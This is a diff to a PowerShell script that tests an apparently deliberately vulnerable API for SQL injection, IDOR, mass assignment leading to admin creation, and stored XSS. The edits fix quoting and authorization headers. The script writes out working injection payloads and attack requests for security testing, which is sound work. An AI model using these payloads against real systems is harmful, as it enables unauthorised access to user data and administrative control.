@@ -23,7 +23,7 @@ function Run-Test($testName, $command) {
     Write-Host "--- Starting Test: $testName ---" -ForegroundColor Cyan
     try {
         # Replace the placeholder with the actual ApiBaseUrl
-        $resolvedCommand = $command.Replace('$API_BASE_URL', $ApiBaseUrl)
+        $resolvedCommand = $command.Replace('$ApiBaseUrl', $ApiBaseUrl)
         Invoke-Expression $resolvedCommand | ConvertTo-Json -Depth 10
     } catch {
         Write-Host "Error running test: $_" -ForegroundColor Red
@@ -62,10 +62,10 @@ Run-Test "Fetch Debug Information" `
 Print-Header "Testing Injection Vulnerabilities"
 
 Run-Test "SQL Injection - User Search (Bypass Auth)" `
-    "Invoke-RestMethod -Uri \"$ApiBaseUrl/api/public/user-search?username=' OR '1'='1' --\" -Method Get"
+    "Invoke-RestMethod -Uri `"$ApiBaseUrl/api/public/user-search?username=' OR '1'='1' --`" -Method Get"
 
 Run-Test "SQL Injection - Product Search (Error-Based)" `
-    "Invoke-RestMethod -Uri \"$ApiBaseUrl/api/products/search?q='\" -Method Get"
+    "Invoke-RestMethod -Uri `"$ApiBaseUrl/api/products/search?q='`" -Method Get"
 
 # 3. Path Traversal
 Print-Header "Testing Path Traversal"
@@ -105,10 +105,10 @@ Write-Host "Successfully logged in as 'attacker_ps'"
 $headers = @{ "Authorization" = "Bearer $TOKEN" }
 
 Run-Test "Attempt IDOR to Access Admin's Order (Order ID 1)" `
-    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/orders/1' -Method Get -Headers \$headers"
+    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/orders/1' -Method Get -Headers @{ Authorization = 'Bearer $TOKEN' }"
 
 Run-Test "Attempt to Export Admin's Data (User ID 1)" `
-    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/users/1/export' -Method Get -Headers \$headers"
+    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/users/1/export' -Method Get -Headers @{ Authorization = 'Bearer $TOKEN' }"
 
 # 5. Mass Assignment
 Print-Header "Testing Mass Assignment Vulnerability"
@@ -137,7 +137,7 @@ if (-not $ADMIN_TOKEN) {
     Write-Host "Successfully logged in as 'eviladmin_ps' - mass assignment likely successful!"
     $adminHeaders = @{ "Authorization" = "Bearer $ADMIN_TOKEN" }
     Run-Test "Verify Admin Access by Fetching All Users" `
-        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/admin/users' -Method Get -Headers \$adminHeaders"
+        "Invoke-RestMethod -Uri '$ApiBaseUrl/api/admin/users' -Method Get -Headers @{ Authorization = 'Bearer $ADMIN_TOKEN' }"
 }
 
 # 6. Cross-Site Scripting (XSS)
@@ -149,7 +149,7 @@ $xssPayload = @{
 } | ConvertTo-Json
 
 Run-Test "Submit Review with XSS Payload" `
-    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1/reviews' -Method Post -Headers \$headers -Body '$xssPayload' -ContentType 'application/json'"
+    "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1/reviews' -Method Post -Headers @{ Authorization = 'Bearer $TOKEN'; 'Content-Type' = 'application/json' } -Body '$xssPayload'"
 
 Run-Test "Verify XSS Payload is Stored" `
     "Invoke-RestMethod -Uri '$ApiBaseUrl/api/products/1' -Method Get"
